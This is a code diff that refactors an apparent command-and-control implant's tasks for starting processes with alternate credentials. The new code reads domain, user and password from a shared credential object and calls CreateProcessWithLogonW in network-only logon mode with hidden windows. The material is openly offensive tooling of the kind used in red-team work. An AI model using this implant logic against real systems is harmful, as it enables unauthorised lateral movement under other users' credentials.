@@ -20,9 +20,9 @@ namespace SaltedCaramel.Tasks
         {
             if (implant.HasAlternateToken())
                 StartProcessWithToken(task, implant);
-            else if (implant.HasCredentials() && Token.Credentials.Value.Value == false)
+            else if (implant.HasCredentials() && Token.Cred.NetOnly == false)
                 StartProcessWithCreds(task, implant);
-            else if (implant.HasCredentials() && Token.Credentials.Value.Value == true)
+            else if (implant.HasCredentials() && Token.Cred.NetOnly == true)
                 StartProcessWithLogon(task, implant);
             else
                 StartProcess(task, implant);
@@ -92,27 +92,6 @@ namespace SaltedCaramel.Tasks
         /// <param name="Credentials"></param>
         public static void StartProcessWithCreds(SCTask task, SCImplant implant)
         {
-            string user;
-            string domain;
-            if (Token.Credentials.Key.Contains("\\"))
-            {
-                domain = Token.Credentials.Key.Split('\\')[0];
-                user = Token.Credentials.Key.Split('\\')[1];
-            }
-            else
-            {
-                domain = ".";
-                user = Token.Credentials.Key;
-            }
-            SecureString pass = new SecureString();
-
-            // Dumb workaround, but we have to do this to make a SecureString
-            // out of a string
-            foreach (char c in Token.Credentials.Value.Key)
-            {
-                pass.AppendChar(c);
-            }
-
             string[] split = task.@params.Trim().Split(' ');
             string argString = string.Join(" ", split.Skip(1).ToArray());
             ProcessStartInfo startInfo = new ProcessStartInfo
@@ -123,9 +102,9 @@ namespace SaltedCaramel.Tasks
                 UseShellExecute = false,
                 RedirectStandardOutput = true, // Ensure we get standard output
                 CreateNoWindow = true, // Don't create a new window
-                Domain = domain,
-                UserName = user,
-                Password = pass
+                Domain = Token.Cred.Domain,
+                UserName = Token.Cred.User,
+                Password = Token.Cred.SecurePassword
             };
 
             using (Process proc = new Process())
@@ -183,20 +162,6 @@ namespace SaltedCaramel.Tasks
                 file = split[0];
             }
 
-            string user;
-            string domain;
-            string password = Token.Credentials.Value.Key;
-            if (Token.Credentials.Key.Contains("\\"))
-            {
-                domain = Token.Credentials.Key.Split('\\')[0];
-                user = Token.Credentials.Key.Split('\\')[1];
-            }
-            else
-            {
-                domain = ".";
-                user = Token.Credentials.Key;
-            }
-
             // STARTUPINFO is used to control a few startup options for our new process
             Win32.Advapi32.STARTUPINFO startupInfo = new Win32.Advapi32.STARTUPINFO();
             // Use C:\Temp as directory to ensure that we have rights to start our new process
@@ -226,9 +191,9 @@ namespace SaltedCaramel.Tasks
 
                     // Finally, create our new process
                     bool createProcess = Win32.Advapi32.CreateProcessWithLogonW(
-                        user,                   // lpUsername
-                        domain,                 // lpDomain
-                        password,               // lpPassword
+                        Token.Cred.User,        // lpUsername
+                        Token.Cred.Domain,      // lpDomain
+                        Token.Cred.Password,    // lpPassword
                         0x00000002,             // dwLogonFlags 0x00000002 = LOGON_NETCREDENTIALS_ONLY
                         null,                   // lpApplicationName
                         file + " " + argString, // lpCommandLineName
